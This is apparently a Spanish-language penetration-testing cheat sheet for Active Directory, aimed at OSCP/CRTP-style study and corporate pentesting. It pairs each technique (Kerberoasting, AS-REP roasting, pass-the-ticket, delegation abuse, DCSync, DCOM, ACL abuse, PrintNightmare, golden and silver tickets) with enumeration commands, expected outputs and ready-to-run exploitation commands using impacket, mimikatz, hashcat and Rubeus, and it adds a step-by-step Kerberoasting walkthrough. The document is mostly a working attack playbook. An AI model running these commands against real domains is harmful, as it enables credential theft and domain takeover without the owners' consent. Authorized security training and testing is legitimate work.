# 🩶 Tabla de Ataques Active Directory – Reconocimiento y Ejecución

| 🛠️ **Ataque** | 🩺 **Condiciones para ser viable** | 📜 **Comando de enumeración** | 🪓 **Salida esperada (OK / NO)** | ⚡ **Comando de explotación** |
|---|---|---|---|---|
| 🎯 **Kerberoasting** | Usuario con permisos de lectura en AD, presencia de cuentas con SPN | `setspn -T dominio -Q */*`<br>`impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/user:pass` | ✅ OK: `CN=svc_account...`<br>❌ NO: `No such object` | `hashcat -m 13100 hash.txt wordlist.txt` |
| 🎯 **AS-REP Roasting** | Usuario con flag `DONT_REQ_PREAUTH` activo | `impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP -no-pass` | ✅ OK: `hash of user@DOMAIN`<br>❌ NO: `Pre-authentication required` | `hashcat -m 18200 hash.txt wordlist.txt` |
| 🎯 **Over-Pass-the-Ticket** | Poseer hash NTLM de usuario de dominio | N/A (tener hash NTLM) | ✅ OK: Hash NTLM disponible<br>❌ NO: No se posee hash | `mimikatz sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe` |
| 🎯 **Pass-the-Ticket** | Poseer ticket TGT/TGS válido (`kirbi` o `ccache`) | `klist` | ✅ OK: `krbtgt/domain`<br>❌ NO: `No credentials available` | `mimikatz kerberos::ptt ticket.kirbi` |
| 🎯 **Delegation Abuse (Unconstrained)** | Cuenta/máquina con `TrustedForDelegation` | `net user <machine$> /domain`<br>`Get-ADComputer -Filter {TrustedForDelegation -eq $true}` | ✅ OK: `Account is trusted for delegation`<br>❌ NO: No se indica delegación | Capturar TGT de usuarios en el host vulnerable usando `Rubeus` |
| 🎯 **Delegation Abuse (Constrained)** | Cuenta con `msDS-AllowedToDelegateTo` configurado | `bloodhound`<br>`Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne $null}` | ✅ OK: SPNs bajo `AllowedToDelegateTo`<br>❌ NO: Sin resultados | `Rubeus s4u` para abuso de `S4U2Proxy` |
| 🎯 **DCSync** | Usuario con `Replicating Directory Changes` | `dsacls "CN=Domain,DC=domain,DC=local"`<br>`bloodhound` | ✅ OK: `Replicating Directory Changes` visible<br>❌ NO: Sin permisos listados | `mimikatz "lsadump::dcsync /user:krbtgt"` |
| 🎯 **DCOM Abuse** | Admin local + DCOM habilitado + puertos abiertos | `nmap -p 135,445 target`<br>`net localgroup Administradores` | ✅ OK: Puertos abiertos + admin<br>❌ NO: Puertos cerrados o sin admin | `SharpCOM` o `wmic /node:"target" /user:"domain\\user" process call create "cmd.exe"` |
| 🎯 **ACL Abuse** | Permisos `GenericAll`, `WriteDACL`, `WriteOwner` | `bloodhound` | ✅ OK: Nodo con permisos excesivos<br>❌ NO: Sin permisos | Abusar con `PowerView Add-DomainObjectAcl` |
| 🎯 **PrintNightmare** | Spooler activo en DC | `rpcdump.py @target | findstr spoolss`<br>`Get-Service -Name Spooler` | ✅ OK: Servicio spooler activo<br>❌ NO: Spooler deshabilitado | Ejecutar exploit PrintNightmare |
| 🎯 **Golden Ticket** | Hash `krbtgt` del dominio | Dump con `mimikatz lsadump::dcsync` | ✅ OK: Hash `krbtgt` extraído<br>❌ NO: Sin hash | `mimikatz kerberos::golden /domain:<domain> /sid:<domain_sid> /krbtgt:<hash>` |
| 🎯 **Silver Ticket** | Hash de servicio (ej: `cifs` del host) | Dump con `mimikatz` | ✅ OK: Hash de servicio extraído<br>❌ NO: Sin hash | `mimikatz kerberos::golden /domain:<domain> /sid:<sid> /target:<fqdn> /service:cifs /rc4:<hash>` |

---

## 🩶 **Ejemplo extendido con salida para Kerberoasting:**

### Enumeración:
```cmd
setspn -T domain -Q */*
```
    ✅ Salida positiva:

```
CN=svc_sql,OU=Service Accounts,DC=domain,DC=local
    MSSQLSvc/SQL01.domain.local:1433
```
> Indica que svc_sql tiene un SPN, es vulnerable a Kerberoasting.

    ❌ Salida negativa:

```
No such object
```
**Indica que no hay cuentas con SPN configurado, no es posible Kerberoasting.**
Ejecución:

```bash
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 domain/user:password
```
Genera hashes para crackear con:

```bash
hashcat -m 13100 hash.txt wordlist.txt
```
🛡️ Uso de esta tabla:

✅ Para cada técnica:

    * Corre el comando de enumeración y compara la salida con el ejemplo.

    * Si coincide con la salida positiva, proceder con la ejecución indicada.

    * Si coincide con la salida negativa, descartar temporalmente ese vector.

✅ Útil para:

    * OSCP/CRTP/CRTE/CRTO.

    * Pentesting corporativo real.

    * Armar dashboards internos para seguimiento de vectores.
